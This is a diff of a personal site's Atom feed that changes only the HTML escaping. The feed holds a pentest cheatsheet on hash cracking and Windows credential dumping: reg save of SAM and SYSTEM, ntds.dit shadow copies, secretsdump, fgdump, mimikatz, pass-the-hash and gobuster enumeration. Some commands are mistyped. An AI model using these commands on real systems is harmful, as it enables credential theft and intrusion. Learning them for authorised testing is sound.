@@ -1,947 +1,947 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2022-04-21T15:28:19-03:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Thekaiz3n</title><subtitle>Personal website</subtitle><author><name>Thekaiz3n</name></author><entry><title type="html">Memory, part 1 - How the memory work</title><link href="http://localhost:4000/blog/2022/04/21/memory-part1.html" rel="alternate" type="text/html" title="Memory, part 1 - How the memory work" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/blog/2022/04/21/memory-part1</id><content type="html" xml:base="http://localhost:4000/blog/2022/04/21/memory-part1.html"><![CDATA[<p>This article is in development.</p>]]></content><author><name>Thekaiz3n</name></author><category term="blog" /><category term="memory" /><category term="neuroscience" /><summary type="html"><![CDATA[This article is in development.]]></summary></entry><entry><title type="html">Memory, part 2 - Using memory as a super power</title><link href="http://localhost:4000/blog/2022/04/21/memory-part2.html" rel="alternate" type="text/html" title="Memory, part 2 - Using memory as a super power" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/blog/2022/04/21/memory-part2</id><content type="html" xml:base="http://localhost:4000/blog/2022/04/21/memory-part2.html"><![CDATA[<p>This article is in development.</p>]]></content><author><name>Thekaiz3n</name></author><category term="blog" /><category term="memory" /><category term="neuroscience" /><summary type="html"><![CDATA[This article is in development.]]></summary></entry><entry><title type="html">Subdomains</title><link href="http://localhost:4000/2022/04/21/subdomains.html" rel="alternate" type="text/html" title="Subdomains" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/2022/04/21/subdomains</id><content type="html" xml:base="http://localhost:4000/2022/04/21/subdomains.html"><![CDATA[<p>Teste</p>]]></content><author><name>Thekaiz3n</name></author><summary type="html"><![CDATA[Teste]]></summary></entry><entry><title type="html">Hashes and basic criptography</title><link href="http://localhost:4000/cheatsheet/2022/01/14/hashes.html" rel="alternate" type="text/html" title="Hashes and basic criptography" /><published>2022-01-14T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/14/hashes</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/14/hashes.html"><![CDATA[<h3 id="examples">Examples</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"teste"</span> | <span class="nb">md5sum
-</span>3b16dc694c38d04f7d7451cc37d3c654  -
-</code></pre></div></div>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2022-04-21T15:40:16-03:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Thekaiz3n</title><subtitle>Personal website</subtitle><author><name>Thekaiz3n</name></author><entry><title type="html">Memory, part 1 - How the memory work</title><link href="http://localhost:4000/blog/2022/04/21/memory-part1.html" rel="alternate" type="text/html" title="Memory, part 1 - How the memory work" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/blog/2022/04/21/memory-part1</id><content type="html" xml:base="http://localhost:4000/blog/2022/04/21/memory-part1.html">&lt;p&gt;This article is in development.&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><category term="blog" /><category term="memory" /><category term="neuroscience" /><summary type="html">This article is in development.</summary></entry><entry><title type="html">Memory, part 2 - Using memory as a super power</title><link href="http://localhost:4000/blog/2022/04/21/memory-part2.html" rel="alternate" type="text/html" title="Memory, part 2 - Using memory as a super power" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/blog/2022/04/21/memory-part2</id><content type="html" xml:base="http://localhost:4000/blog/2022/04/21/memory-part2.html">&lt;p&gt;This article is in development.&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><category term="blog" /><category term="memory" /><category term="neuroscience" /><summary type="html">This article is in development.</summary></entry><entry><title type="html">Subdomains</title><link href="http://localhost:4000/2022/04/21/subdomains.html" rel="alternate" type="text/html" title="Subdomains" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/2022/04/21/subdomains</id><content type="html" xml:base="http://localhost:4000/2022/04/21/subdomains.html">&lt;p&gt;Teste&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><summary type="html">Teste</summary></entry><entry><title type="html">Hashes and basic criptography</title><link href="http://localhost:4000/cheatsheet/2022/01/14/hashes.html" rel="alternate" type="text/html" title="Hashes and basic criptography" /><published>2022-01-14T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/14/hashes</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/14/hashes.html">&lt;h3 id=&quot;examples&quot;&gt;Examples&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;teste&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;md5sum
+&lt;/span&gt;3b16dc694c38d04f7d7451cc37d3c654  -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"teste"</span> | <span class="nb">sha256sum 
-</span>a0ec927b1044a5e945fbd9cf4370b4be1bc1ebc93bca51bc37f02a8814196bde  -
-</code></pre></div></div>
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;teste&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sha256sum 
+&lt;/span&gt;a0ec927b1044a5e945fbd9cf4370b4be1bc1ebc93bca51bc37f02a8814196bde  -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">md5sum </span>teste.txt
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;teste.txt
 2dc6bdf12b1b886e5e2f3a72f4fb2293  teste.txt
-</code></pre></div></div>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="one-way-x-two-way">One way x Two way</h3>
+&lt;h3 id=&quot;one-way-x-two-way&quot;&gt;One way x Two way&lt;/h3&gt;
 
-<ul>
-  <li>
-    <p>One way: Hash without reverse, only way to break is brute force</p>
-  </li>
-  <li>
-    <p>Two way: Base64 is a example is possible to do the reverse.</p>
-  </li>
-</ul>
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;One way: Hash without reverse, only way to break is brute force&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Two way: Base64 is a example is possible to do the reverse.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="hash-lenght">Hash lenght</h3>
-<ul>
-  <li>md5: 32 characters</li>
-  <li>sha1: 40 characters</li>
-  <li>sha256: 64 characters</li>
-  <li>sha512: 128 characters</li>
-</ul>
+&lt;h3 id=&quot;hash-lenght&quot;&gt;Hash lenght&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;md5: 32 characters&lt;/li&gt;
+  &lt;li&gt;sha1: 40 characters&lt;/li&gt;
+  &lt;li&gt;sha256: 64 characters&lt;/li&gt;
+  &lt;li&gt;sha512: 128 characters&lt;/li&gt;
+&lt;/ul&gt;
 
-<h2 id="linux">Linux</h2>
-<h3 id="indentify-hashes">Indentify hashes</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hash-identifier 3b16dc694c38d04f7d7451cc37d3c654
-</code></pre></div></div>
+&lt;h2 id=&quot;linux&quot;&gt;Linux&lt;/h2&gt;
+&lt;h3 id=&quot;indentify-hashes&quot;&gt;Indentify hashes&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hash-identifier 3b16dc694c38d04f7d7451cc37d3c654
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="linux-hashes">Linux hashes</h3>
-<p>Are in /etc/shadow.<br />
-In this format: $id$salt$encrypted</p>
-<ul>
-  <li>id: Mehtod type: 1 = md5, 5 = sha256, 6 = sha512</li>
-  <li>salt: Random information to help to protect the hash.</li>
-  <li>encypted: Its the hash with salt.
-    <ul>
-      <li>kali:$y$j9T$GLYvBrczFiXmyft7hxEwX/$ev6ucG67u9pWBLvf7b1WoUTRQMXUDoK5gtuzUOQDU73:18819:0:99999:7::: : Use yescrypt($y$), derivate from originals functions.</li>
-    </ul>
-  </li>
-</ul>
+&lt;h3 id=&quot;linux-hashes&quot;&gt;Linux hashes&lt;/h3&gt;
+&lt;p&gt;Are in /etc/shadow.&lt;br /&gt;
+In this format: $id$salt$encrypted&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;id: Mehtod type: 1 = md5, 5 = sha256, 6 = sha512&lt;/li&gt;
+  &lt;li&gt;salt: Random information to help to protect the hash.&lt;/li&gt;
+  &lt;li&gt;encypted: Its the hash with salt.
+    &lt;ul&gt;
+      &lt;li&gt;kali:$y$j9T$GLYvBrczFiXmyft7hxEwX/$ev6ucG67u9pWBLvf7b1WoUTRQMXUDoK5gtuzUOQDU73:18819:0:99999:7::: : Use yescrypt($y$), derivate from originals functions.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="decrypt">Decrypt</h3>
-<h4 id="worldlists">Worldlists</h4>
-<ul>
-  <li>/usr/share/wordlists/rockyou.txt</li>
-  <li>/usr/share/john/password.lst</li>
-</ul>
+&lt;h3 id=&quot;decrypt&quot;&gt;Decrypt&lt;/h3&gt;
+&lt;h4 id=&quot;worldlists&quot;&gt;Worldlists&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;/usr/share/wordlists/rockyou.txt&lt;/li&gt;
+  &lt;li&gt;/usr/share/john/password.lst&lt;/li&gt;
+&lt;/ul&gt;
 
-<h4 id="john-the-ripper">John the ripper</h4>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jonh <span class="nb">hash 
-</span>jonh —format<span class="o">=</span>Raw-MD5 —wordlist<span class="o">=</span>rockyou.txt
-</code></pre></div></div>
-<h4 id="hashcat">Hashcat</h4>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 100 <span class="nb">hash</span> /usr/share/john/password.lst —force
-</code></pre></div></div>
+&lt;h4 id=&quot;john-the-ripper&quot;&gt;John the ripper&lt;/h4&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jonh &lt;span class=&quot;nb&quot;&gt;hash 
+&lt;/span&gt;jonh —format&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Raw-MD5 —wordlist&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;hashcat&quot;&gt;Hashcat&lt;/h4&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 100 &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; /usr/share/john/password.lst —force
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="windows">Windows</h2>
-<p><strong>SAM  -Security Account manager(Windows)</strong> : User accounts.</p>
-<ul>
-  <li>%SystemRoot%/system32/config/sam</li>
-</ul>
+&lt;h2 id=&quot;windows&quot;&gt;Windows&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;SAM  -Security Account manager(Windows)&lt;/strong&gt; : User accounts.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;%SystemRoot%/system32/config/sam&lt;/li&gt;
+&lt;/ul&gt;
 
-<p><strong>NTDS.NIT(Windows server/Active directory)</strong> : Active directory include users..</p>
-<ul>
-  <li>%SystemRoot%/ntds/ntds.dit</li>
-</ul>
+&lt;p&gt;&lt;strong&gt;NTDS.NIT(Windows server/Active directory)&lt;/strong&gt; : Active directory include users..&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;%SystemRoot%/ntds/ntds.dit&lt;/li&gt;
+&lt;/ul&gt;
 
-<p><strong>SYSTEM</strong>: System file, use do decrypt sam/ndts.dit</p>
-<ul>
-  <li>%systemroot%/system32/config/system</li>
-</ul>
+&lt;p&gt;&lt;strong&gt;SYSTEM&lt;/strong&gt;: System file, use do decrypt sam/ndts.dit&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;%systemroot%/system32/config/system&lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="hash">Hash</h3>
-<p>usser:id:LM(LAN MANAGER):NTLM(NT LAM MANAGER)</p>
-<ul>
-  <li>ids: 500-adm:501-guest, 1000:helpassistant,1005:user</li>
-  <li>LM: If begin with aa and finish ee (always equal), not used == empty.</li>
-</ul>
+&lt;h3 id=&quot;hash&quot;&gt;Hash&lt;/h3&gt;
+&lt;p&gt;usser:id:LM(LAN MANAGER):NTLM(NT LAM MANAGER)&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;ids: 500-adm:501-guest, 1000:helpassistant,1005:user&lt;/li&gt;
+  &lt;li&gt;LM: If begin with aa and finish ee (always equal), not used == empty.&lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="old-windows">Old Windows</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save hklm<span class="se">\s</span>am samcopy
-reg save hklm<span class="se">\s</span>ystem systemcopy
+&lt;h3 id=&quot;old-windows&quot;&gt;Old Windows&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg save hklm&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;am samcopy
+reg save hklm&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem systemcopy
 
 
-samdump2 samcopy systemcopy <span class="c"># Show hashes</span>
+samdump2 samcopy systemcopy &lt;span class=&quot;c&quot;&gt;# Show hashes&lt;/span&gt;
 
-impacket-secretdump <span class="nt">-sam</span> samcopy <span class="nt">-system</span> systemcopy LOCAL <span class="c"># Better</span>
-</code></pre></div></div>
+impacket-secretdump &lt;span class=&quot;nt&quot;&gt;-sam&lt;/span&gt; samcopy &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; systemcopy LOCAL &lt;span class=&quot;c&quot;&gt;# Better&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="modernactive-directory">Modern/Active directory</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin create shadow /for<span class="o">=</span>c:
-copy <span class="s2">"volumecreated"</span><span class="se">\w</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit c:<span class="se">\n</span>tds.dit
-copy <span class="s2">"volumecreated"</span><span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>onfig<span class="se">\ </span>c:<span class="se">\s</span>ystem1222
+&lt;h3 id=&quot;modernactive-directory&quot;&gt;Modern/Active directory&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vssadmin create shadow /for&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;c:
+copy &lt;span class=&quot;s2&quot;&gt;&quot;volumecreated&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds.dit c:&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds.dit
+copy &lt;span class=&quot;s2&quot;&gt;&quot;volumecreated&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;onfig&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;c:&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem1222
 
-impacket-secretdump <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system1222 LOCAL
-</code></pre></div></div>
-<h3 id="in-cache">In cache</h3>
-<p>Meterpreter</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload /usr/share/windows-binaries/fgdump/fgdump.exe <span class="c"># Upload do victim</span>
-fgdumpe.exe <span class="c"># Execute will create cachedump e pwdump</span>
+impacket-secretdump &lt;span class=&quot;nt&quot;&gt;-ntds&lt;/span&gt; ntds.dit &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; system1222 LOCAL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;in-cache&quot;&gt;In cache&lt;/h3&gt;
+&lt;p&gt;Meterpreter&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upload /usr/share/windows-binaries/fgdump/fgdump.exe &lt;span class=&quot;c&quot;&gt;# Upload do victim&lt;/span&gt;
+fgdumpe.exe &lt;span class=&quot;c&quot;&gt;# Execute will create cachedump e pwdump&lt;/span&gt;
 
 upload /usr/share/windows-resources/wce/wce-universal 
-wce-universal.exe <span class="nt">-w</span> <span class="c"># Will get the passwords</span>
+wce-universal.exe &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Will get the passwords&lt;/span&gt;
 
-load mimikatz <span class="c"># Meterpreter module</span>
-wdigest <span class="c"># Cache and more</span>
-</code></pre></div></div>
+load mimikatz &lt;span class=&quot;c&quot;&gt;# Meterpreter module&lt;/span&gt;
+wdigest &lt;span class=&quot;c&quot;&gt;# Cache and more&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin create shadow /for<span class="o">=</span>c:
-copy <span class="s2">"volumecreated"</span><span class="se">\w</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit c:<span class="se">\n</span>tds.dit
-copy <span class="s2">"volumecreated"</span><span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>onfig<span class="se">\ </span>c:<span class="se">\s</span>ystem1222
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vssadmin create shadow /for&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;c:
+copy &lt;span class=&quot;s2&quot;&gt;&quot;volumecreated&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds.dit c:&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds.dit
+copy &lt;span class=&quot;s2&quot;&gt;&quot;volumecreated&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;onfig&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;c:&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem1222
 
-impacket-secretdump <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system1222 LOCAL
-</code></pre></div></div>
+impacket-secretdump &lt;span class=&quot;nt&quot;&gt;-ntds&lt;/span&gt; ntds.dit &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; system1222 LOCAL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h4 id="john-the-ripper-1">John the ripper</h4>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john —format<span class="o">=</span>nt —wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hashlist —show 
-john —format<span class="o">=</span>lm —wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hashlist —show 
-</code></pre></div></div>
+&lt;h4 id=&quot;john-the-ripper-1&quot;&gt;John the ripper&lt;/h4&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john —format&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nt —wordlist&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hashlist —show 
+john —format&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lm —wordlist&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hashlist —show 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="pass-the-hash">Pass the hash*</h3>
-<p>It’s possible use the hash.</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pth-winexe <span class="nt">-U</span> john%<span class="s2">"hash"</span> //172.16.1.60 cmd.exe
-exploit/windows/smb/psexec <span class="c">#SMB pass the hash</span>
-</code></pre></div></div>]]></content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="exploitation" /><category term="hashes" /><summary type="html"><![CDATA[This is a guide for hashes in linux and windows]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/hashes.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/hashes.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Exploitation</title><link href="http://localhost:4000/guide/2022/01/13/enumeration.html" rel="alternate" type="text/html" title="Exploitation" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/enumeration</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/enumeration.html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
+&lt;h3 id=&quot;pass-the-hash&quot;&gt;Pass the hash*&lt;/h3&gt;
+&lt;p&gt;It’s possible use the hash.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pth-winexe &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; john%&lt;span class=&quot;s2&quot;&gt;&quot;hash&quot;&lt;/span&gt; //172.16.1.60 cmd.exe
+exploit/windows/smb/psexec &lt;span class=&quot;c&quot;&gt;#SMB pass the hash&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="exploitation" /><category term="hashes" /><summary type="html">This is a guide for hashes in linux and windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/hashes.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/hashes.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Exploitation</title><link href="http://localhost:4000/guide/2022/01/13/enumeration.html" rel="alternate" type="text/html" title="Exploitation" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/enumeration</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/enumeration.html">&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
 
-<h2 id="brute-force-directorypagesfiles">Brute force directory/pages/files</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-e</span> <span class="nt">-u</span> 172.16.1.10/ <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-s</span> <span class="s2">"200,301,302,401"</span> <span class="nb">.</span>
+&lt;h2 id=&quot;brute-force-directorypagesfiles&quot;&gt;Brute force directory/pages/files&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; 172.16.1.10/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/big.txt &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;200,301,302,401&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 
-gobuster <span class="nb">dir</span> <span class="nt">-e</span> <span class="nt">-u</span> http://172.16.1.10/turismo <span class="nt">-w</span> /usr/share/wordlists/dirb/small.txt <span class="nt">-x</span> .php,.txt,.sql,.bkp  <span class="c">#Search by extensions.</span>
+gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://172.16.1.10/turismo &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/small.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; .php,.txt,.sql,.bkp  &lt;span class=&quot;c&quot;&gt;#Search by extensions.&lt;/span&gt;
 
-gobuster <span class="nb">dir</span> <span class="nt">-e</span> <span class="nt">-u</span> 192.168.0.7 <span class="nt">-w</span> wordlist <span class="nt">-x</span> .php <span class="nt">-c</span> cookie <span class="c"># Pass cookie</span>
-</code></pre></div></div>
+gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; 192.168.0.7 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; wordlist &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; .php &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; cookie &lt;span class=&quot;c&quot;&gt;# Pass cookie&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<p>Another tools:</p>
-<ul>
-  <li>Dirsearch</li>
-  <li>Dirb</li>
-  <li>Dirbusters</li>
-</ul>
+&lt;p&gt;Another tools:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Dirsearch&lt;/li&gt;
+  &lt;li&gt;Dirb&lt;/li&gt;
+  &lt;li&gt;Dirbusters&lt;/li&gt;
+&lt;/ul&gt;
 
-<p>File extensions to search:
+&lt;p&gt;File extensions to search:
     - Web :.pl,.cgi,.sh,.php,.jsp,.asp,.aspx,.js,.html,.nm
     - Backups:.bkp,.bak,.sql
-    - Files:.pdf,.txt,.conf,.xml</p>
+    - Files:.pdf,.txt,.conf,.xml&lt;/p&gt;
 
-<p>Robots.txt/sitemap.xml are importants file that contains directories that are not indexed.</p>
+&lt;p&gt;Robots.txt/sitemap.xml are importants file that contains directories that are not indexed.&lt;/p&gt;
 
